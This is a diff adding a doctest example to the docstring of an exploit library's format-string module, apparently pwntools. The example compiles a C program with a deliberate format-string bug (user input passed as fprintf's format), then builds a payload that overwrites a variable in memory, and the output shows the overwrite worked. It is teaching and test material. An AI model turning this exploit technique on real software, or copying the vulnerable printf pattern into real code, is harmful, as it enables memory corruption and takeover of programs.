@@ -1,5 +1,47 @@
-"""
+r"""
 Provide some tools to exploit format string bug
+
+Examples:
+
+    >>> context.log_level = 'error'
+    >>> program = "\n".join([
+    ...     "#include <stdio.h>",
+    ...     "#include <stdlib.h>",
+    ...     "#include <string.h>",
+    ...     "int main(int argc, char const *argv[])",
+    ...     "{",
+    ...     "       char buff[1024];",
+    ...     "       int my_var = 0x0;",
+    ...     '       printf("my_var = %08X, @my_var = %p\\n", my_var, &my_var);',
+    ...     '       scanf("%s", buff);',
+    ...     "       fprintf(stderr, buff);",
+    ...     "       putchar('\\n');",
+    ...     '       printf("my_var = %08X", my_var);',
+    ...     "       return 0;",
+    ...     "}"
+    ... ])
+    >>> filename_program = tempfile.mktemp()
+    >>> filename_source = tempfile.mktemp() + ".c"
+    >>> with open(filename_source, 'w') as f:
+    ...     f.write(program)
+    ...
+    >>> gcc = process([which("gcc"), filename_source, "-Wno-format-security", "-m32", "-o", filename_program])
+    >>> gcc.recvall()
+    ''
+    >>> def exec_fmt(payload):
+    ...     p = process(filename_program)
+    ...     p.recvline()
+    ...     p.sendline(payload)
+    ...     return p.recvline()[:-1]
+    ...
+    >>> autofmt = FmtStr(exec_fmt)
+    >>> offset = autofmt.offset
+    >>> p = process(filename_program, stderr=open('/dev/null', 'w+'))
+    >>> data = p.recvline()
+    >>> addr = int(data.split("=")[-1].strip(), 16)
+    >>> p.sendline(fmtstr_payload(offset, {addr: 0x1337babe}))
+    >>> print p.recvall().strip()
+    my_var = 1337BABE
 
 Example - Payload generation
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
